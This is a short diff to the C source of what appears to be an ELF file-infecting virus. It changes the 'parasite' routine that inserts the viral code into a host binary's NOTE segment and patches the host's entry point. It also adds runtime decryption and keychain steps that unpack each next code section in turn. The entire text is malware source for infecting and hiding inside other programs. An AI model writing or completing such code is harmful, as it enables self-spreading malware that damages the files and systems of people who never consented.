@@ -37,19 +37,27 @@ __attribute__((always_inline)) static inline void patch_entry_point(char *dst, c
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-void parasite(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_injection *injection)
+void parasite(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_infect *infect)
 {
-
 #if LOGGER
 	MID_LOGGER("parasite:\t\t");
 #endif
 
+	decrypt_right(keychain, (char *)injection, (void *)parasite - (void *)injection);
+
 	if (context == FAILURE)
 		goto label;
 
-	insert_parasite(injection->ptr, host->segment);
-	patch_entry_point(injection->ptr, host);
+	char *ptr = infect->ptr + (host->segment[NOTE]->p_offset + ((void *)parasite - (void *)__entry));
+
+	insert_parasite(infect->ptr, host->segment);
+	patch_entry_point(infect->ptr, host);
+
+	decrypt_left(keychain, ptr, (void *)stub - (void *)parasite);
 
 label:
-	stub(host, keychain, context, injection);
+	update_keychain_right(keychain, (char *)parasite, (void *)stub - (void *)parasite);
+	decrypt_right(keychain, (char *)stub, (void *)sign - (void *)stub);
+
+	stub(host, keychain, context, infect);
 }
